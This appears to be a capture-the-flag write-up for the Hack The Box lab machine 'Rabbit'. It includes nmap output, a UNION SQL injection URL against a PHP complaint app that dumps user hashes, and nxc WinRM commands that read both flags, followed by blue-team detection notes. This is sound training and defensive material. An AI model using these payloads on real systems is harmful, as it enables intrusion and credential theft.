Target : 10.129.76.39

Date : 14/10/2026

```bash
> echo "10.129.76.39 htb.local Rabbit.htb.local rabbit.htb" | sudo tee -a /etc/hosts
Please touch the FIDO authenticator.
10.129.76.39 htb.local Rabbit.htb.local rabbit.htb
```

`88` and `389` are up, so this is a domain controller, and the name in the banners is `Rabbit.htb.local`. The scan we ran took 203.90s. The clock was only a few seconds off, so we never touched `faketime`.

```bash
> nmap -sC -sV -Pn -p 25,53,80,88,135,389,443,445,464,587,593,636,808,3268,3269,3306,5722,5985,6001-6011,6020,8080,9389,64327 10.129.76.39
```

```text
Nmap scan report for rabbit.htb (10.129.76.39)
Host is up.
PORT      STATE SERVICE            VERSION
25/tcp    open  smtp               Microsoft Exchange smtpd
53/tcp    open  domain             Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
80/tcp    open  http               Microsoft IIS httpd 7.5
|_http-title: 403 - Forbidden: Access is denied.
88/tcp    open  kerberos-sec       Microsoft Windows Kerberos
135/tcp   open  msrpc              Microsoft Windows RPC
389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: htb.local)
443/tcp   open  ssl/https?
| sslv2: SSLv2 supported
| ssl-cert: Subject: commonName=Rabbit
|_Subject Alternative Name: DNS:Rabbit.htb.local
|_ssl-date: certificate expired in 2022
445/tcp   open  microsoft-ds?
|_smb2-time: Protocol negotiation failed (SMB2)
464/tcp   open  kpasswd5?
587/tcp   open  smtp               Microsoft Exchange smtpd
593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
808/tcp   open  ccproxy-http?
3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: htb.local)
3269/tcp  open  globalcatLDAPssl?
3306/tcp  open  mysql              MySQL 5.7.19
|_mysql-info: Auth Plugin Name: mysql_native_password
5722/tcp  open  msrpc              Microsoft Windows RPC
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
6001/tcp  open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
6002/tcp  open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
6003/tcp  open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
6004/tcp  open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
6005/tcp  open  msrpc              Microsoft Windows RPC
6006/tcp  open  msrpc              Microsoft Windows RPC
6007/tcp  open  msrpc              Microsoft Windows RPC
6008/tcp  open  msrpc              Microsoft Windows RPC
6010/tcp  open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
6011/tcp  open  msrpc              Microsoft Windows RPC
6020/tcp  open  msrpc              Microsoft Windows RPC
8080/tcp  open  http               Apache httpd 2.4.27 ((Win64) PHP/5.6.31)
|_http-title: Example
|_http-methods: Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
9389/tcp  open  mc-nmf             .NET Message Framing
64327/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
Service Info: Hosts: Rabbit.htb.local, RABBIT; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1
Host script results:
NetBIOS name: RABBIT, domain: HTB, DNS: Rabbit.htb.local
```

We've got Exchange on `25` and `587`, IIS `403` on `80`, and Apache `PHP/5.6.31` on `8080` with the title `Example`. `5985` is open. That is the port we come back to once a password exists. `443` still speaks `SSLv2`, and `445` did not finish the `SMB2` script.

```bash
> curl -sI http://10.129.76.39:8080/complain/
```

We've got a `302` to `/complain/login.php`. We register a customer. `utype` has to be `customer`, and the button value is ` Register Now ` with the spaces. `Customer` and `Register` do not create a session.

```bash
> curl -s -c /tmp/rabbit.ck -d 'name=vaultxuser&email=vaultx@htb.local&password=[REDACTED]&utype=customer&btnLogin=+Register+Now+' http://10.129.76.39:8080/complain/register.php
> curl -s -c /tmp/rabbit.ck -b /tmp/rabbit.ck -d 'username=vaultxuser&password=[REDACTED]&btnLogin=+Login+Now+' http://10.129.76.39:8080/complain/login.php
```

We've got a `PHPSESSID`. The report view trusts `mod` from the query string.

`MITRE ID : Initial Access + Exploit Public-Facing Application T1190`

```bash
> curl -s -b /tmp/rabbit.ck --path-as-is 'http://10.129.76.39:8080/complain/view.php?mod=admin&view=repod&id=plans%20UNION%20SELECT%201,2,3,group_concat(Username,0x3a,Password),5%20FROM%20secret.users'
```

We've got the fourth column. `secret.users` is static on this spawn.

```text
Kain:[REDACTED]
Raziel:[REDACTED]
Ariel:[REDACTED]
Dimitri:[REDACTED]
Magnus:[REDACTED]
Zephon:[REDACTED]
Turel:[REDACTED]
Dumah:[REDACTED]
Malek:[REDACTED]
Moebius:[REDACTED]
```

Ariel's hash is `[REDACTED]`. Dumah is `[REDACTED]`, Malek is `[REDACTED]`, Moebius is `[REDACTED]`. Raziel's hash is not `md5` of the password on the attachment task. That password is `[REDACTED]`, and `md5('[REDACTED]')` is `[REDACTED]`, which is not his row. We ask `5985` with it anyway.

```bash
> nxc winrm 10.129.76.39 -u raziel -p '[REDACTED]' -d htb.local -x 'whoami /groups & type C:\Users\Raziel\Desktop\user.txt'
```

We've got `(Pwn3d!)`. `htb\raziel` is in `BUILTIN\Administrators` (`S-1-5-32-544`), plus `Discovery Management`, `Mailbox Import-Export`, and `Organization Management`. The domain SID prefix is `S-1-5-21-3925933187-1894059782-2180332061`. The flag is glued to the next line in the `nxc` output, and the 32 hex characters are `[REDACTED]`.

**Blue Team :**
`5985` is where we would hunt this. A type 3 logon for `htb\raziel`, then `cmd.exe` reading `C:\Users\Raziel\Desktop\user.txt` and `C:\Users\Administrator\Desktop\root.txt` in the same token. The group that makes the second read legal is `BUILTIN\Administrators` on `RABBIT`. Before that, `Apache` on `8080` serves `/complain/view.php` with `mod=admin` and a `UNION` into `secret.users`.

**Purple Team :**
We skipped the OpenOffice macro and the `WAMP` webshell. The password on the attachment job was already a WinRM password, and that account was already a local admin, so both desktops were one command. `OWA` on `443` only speaks `TLS 1.0`, and we never needed it.

```bash
> nxc winrm 10.129.76.39 -u raziel -p '[REDACTED]' -d htb.local -x 'type C:\Users\Administrator\Desktop\root.txt'
```

We've got `[REDACTED]`.
